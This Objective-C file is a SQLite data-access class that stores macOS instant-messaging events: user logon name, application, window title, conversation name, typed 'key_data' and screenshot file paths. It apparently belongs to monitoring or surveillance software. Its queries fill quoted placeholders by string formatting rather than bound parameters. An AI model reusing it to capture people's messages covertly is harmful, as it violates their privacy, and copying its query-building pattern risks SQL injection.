//
//  IMMacOSDAO.m
//  FxSqLite
//
//  Created by Makara Khloth on 2/3/15.
//
//

#import "IMMacOSDAO.h"
#import "FxIMMacOSEvent.h"
#import "FxSqlString.h"
#import "DAOFunction.h"
#import "FxSqliteView.h"
#import "DetailedCount.h"

#import <sqlite3.h>

// Select/Insert/Delete/Update/Count IM mac os table
static NSString * const kSelectIMMacOSSql           = @"SELECT * FROM im_mac_os;";
static NSString * const kSelectWhereIMMacOSSql      = @"SELECT * FROM im_mac_os WHERE id = ?;";
static NSString * const kInsertIMMacOSSql           = @"INSERT INTO im_mac_os VALUES(NULL, '?', '?', '?', '?', '?', ?, '?', '?', '?');";
static NSString * const kDeleteIMMacOSSql           = @"DELETE FROM im_mac_os WHERE id = ?;";
static NSString * const kUpdateIMMacOSSql           = @"UPDATE im_mac_os SET time = '?',"
                                                        "user_logon_name = '?',"
                                                        "application_id = '?',"
                                                        "application_name = '?',"
                                                        "title = '?',"
                                                        "im_service_id = ?,"
                                                        "conversation_name = '?',"
                                                        "key_data = '?',"
                                                        "snapshot_file_path = '?'"
                                                        " WHERE id = ?;";
static NSString * const kCountAllIMMacOSSql         = @"SELECT Count(*) FROM im_mac_os;";

@implementation IMMacOSDAO

- (id) initWithSQLite3: (sqlite3 *) aSQLite3 {
    if ((self = [super init])) {
        mSQLite3 = aSQLite3;
    }
    return (self);
}

- (NSInteger) deleteEvent: (NSInteger) aEventID {
    NSInteger numEventDeleted		= 0;
    FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kDeleteIMMacOSSql];
    [sqlString formatInt:aEventID atIndex:0];
    const NSString *sqlStatement	= [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventDeleted++;
    return (numEventDeleted);
}

- (NSInteger) insertEvent: (FxEvent *) aNewEvent {
    NSInteger numEventInserted		= 0;
    FxIMMacOSEvent *newIMMacOSEvent = (FxIMMacOSEvent *)aNewEvent;
    FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kInsertIMMacOSSql];
    
    [sqlString formatString:newIMMacOSEvent.dateTime atIndex:0];
    [sqlString formatString:newIMMacOSEvent.mUserLogonName atIndex:1];
    [sqlString formatString:newIMMacOSEvent.mApplicationID atIndex:2];
    [sqlString formatString:newIMMacOSEvent.mApplicationName atIndex:3];
    [sqlString formatString:newIMMacOSEvent.mTitle atIndex:4];
    [sqlString formatInt:newIMMacOSEvent.mIMServiceID atIndex:5];
    [sqlString formatString:newIMMacOSEvent.mConversationName atIndex:6];
    [sqlString formatString:newIMMacOSEvent.mKeyData atIndex:7];
    [sqlString formatString:newIMMacOSEvent.mSnapshotFilePath atIndex:8];
    
    const NSString *sqlStatement	= [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventInserted++;
    return (numEventInserted);
}

- (FxEvent *) selectEvent: (NSInteger) aEventID {
    FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kSelectWhereIMMacOSSql];
    [sqlString formatInt:aEventID atIndex:0];
    
    const NSString *sqlStatement	= [sqlString finalizeSqlString];
    [sqlString release];
    
    FxSqliteView *fxSqliteView		= [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
    
    FxIMMacOSEvent *newIMMacOSEvent             = [[FxIMMacOSEvent alloc] init];
    newIMMacOSEvent.eventId                     = [fxSqliteView intFieldValue:0];
    newIMMacOSEvent.dateTime                    = [fxSqliteView stringFieldValue:1];
    newIMMacOSEvent.mUserLogonName              = [fxSqliteView stringFieldValue:2];
    newIMMacOSEvent.mApplicationID              = [fxSqliteView stringFieldValue:3];
    newIMMacOSEvent.mApplicationName            = [fxSqliteView stringFieldValue:4];
    newIMMacOSEvent.mTitle                      = [fxSqliteView stringFieldValue:5];
    newIMMacOSEvent.mIMServiceID                = (FxIMServiceID)[fxSqliteView intFieldValue:6];
    newIMMacOSEvent.mConversationName           = [fxSqliteView stringFieldValue:7];
    newIMMacOSEvent.mKeyData                    = [fxSqliteView stringFieldValue:8];
    newIMMacOSEvent.mSnapshotFilePath           = [fxSqliteView stringFieldValue:9];
    
    [fxSqliteView done];
    [newIMMacOSEvent autorelease];
    return (newIMMacOSEvent);
}

- (NSArray *) selectMaxEvent: (NSInteger) aMaxEvent {
    NSMutableArray *eventArrays			= [[NSMutableArray alloc] init];
    
    FxSqlString *sqlString				= [[FxSqlString alloc] initWithSqlFormat:kSelectIMMacOSSql];
    const NSString *sqlStatement		= [sqlString finalizeSqlString];
    [sqlString release];
    
    FxSqliteView* fxSqliteView			= [DAOFunction execQuery:mSQLite3 withSqlStatement:sqlStatement];
    NSInteger count						= 0;
    
    while (count < aMaxEvent && !fxSqliteView.eof) {
        FxIMMacOSEvent *newIMMacOSEvent             = [[FxIMMacOSEvent alloc] init];
        newIMMacOSEvent.eventId                     = [fxSqliteView intFieldValue:0];
        newIMMacOSEvent.dateTime                    = [fxSqliteView stringFieldValue:1];
        newIMMacOSEvent.mUserLogonName              = [fxSqliteView stringFieldValue:2];
        newIMMacOSEvent.mApplicationID              = [fxSqliteView stringFieldValue:3];
        newIMMacOSEvent.mApplicationName            = [fxSqliteView stringFieldValue:4];
        newIMMacOSEvent.mTitle                      = [fxSqliteView stringFieldValue:5];
        newIMMacOSEvent.mIMServiceID                = (FxIMServiceID)[fxSqliteView intFieldValue:6];
        newIMMacOSEvent.mConversationName           = [fxSqliteView stringFieldValue:7];
        newIMMacOSEvent.mKeyData                    = [fxSqliteView stringFieldValue:8];
        newIMMacOSEvent.mSnapshotFilePath           = [fxSqliteView stringFieldValue:9];
        
        [eventArrays addObject:newIMMacOSEvent];
        [newIMMacOSEvent release];
        count++;
        [fxSqliteView nextRow];
    }
    [fxSqliteView done];
    [eventArrays autorelease];
    return (eventArrays);
}

- (NSInteger) updateEvent: (FxEvent *) aNewEvent {
    NSInteger numEventUpdated		= 0;
    FxSqlString *sqlString			= [[FxSqlString alloc] initWithSqlFormat:kUpdateIMMacOSSql];
    
    FxIMMacOSEvent *newIMMacOSEvent = (FxIMMacOSEvent *)aNewEvent;
    [sqlString formatString:newIMMacOSEvent.dateTime atIndex:0];
    [sqlString formatString:newIMMacOSEvent.mUserLogonName atIndex:1];
    [sqlString formatString:newIMMacOSEvent.mApplicationID atIndex:2];
    [sqlString formatString:newIMMacOSEvent.mApplicationName atIndex:3];
    [sqlString formatString:newIMMacOSEvent.mTitle atIndex:4];
    [sqlString formatInt:newIMMacOSEvent.mIMServiceID atIndex:5];;
    [sqlString formatString:newIMMacOSEvent.mConversationName atIndex:6];
    [sqlString formatString:newIMMacOSEvent.mKeyData atIndex:7];
    [sqlString formatString:newIMMacOSEvent.mSnapshotFilePath atIndex:8];
    [sqlString formatInt:newIMMacOSEvent.eventId atIndex:9];
    
    const NSString *sqlStatement	= [sqlString finalizeSqlString];
    [sqlString release];
    [DAOFunction execDML:mSQLite3 withSqlStatement:sqlStatement];
    numEventUpdated++;
    return (numEventUpdated);
}

- (DetailedCount *) countEvent {
    DetailedCount *detailedCount	= [[DetailedCount alloc] init];
    
    // Total count
    detailedCount.totalCount		= [DAOFunction execScalar:mSQLite3 withSqlStatement:kCountAllIMMacOSSql];
    [detailedCount autorelease];
    
    return (detailedCount);
}

- (void) dealloc {
    [super dealloc];
}

@end
